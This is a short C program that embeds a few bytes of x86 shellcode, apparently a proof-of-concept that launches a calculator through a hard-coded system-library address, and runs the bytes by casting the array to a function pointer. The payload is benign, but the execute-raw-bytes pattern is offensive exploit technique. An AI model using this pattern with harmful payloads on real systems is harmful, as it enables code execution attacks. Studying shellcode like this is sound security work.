unsigned char shellcode[] = "\xeB\x02\xBA\xC7\x93"
                            "\xBF\x77\xFF\xD2\xCC"
                            "\xE8\xF3\xFF\xFF\xFF"
                            "\x63\x61\x6C\xC3";

int main()
{
    int (*exeshell) ();
    exeshell = (int (*) ()) shellcode;
    (int) (*exeshell) ();
}
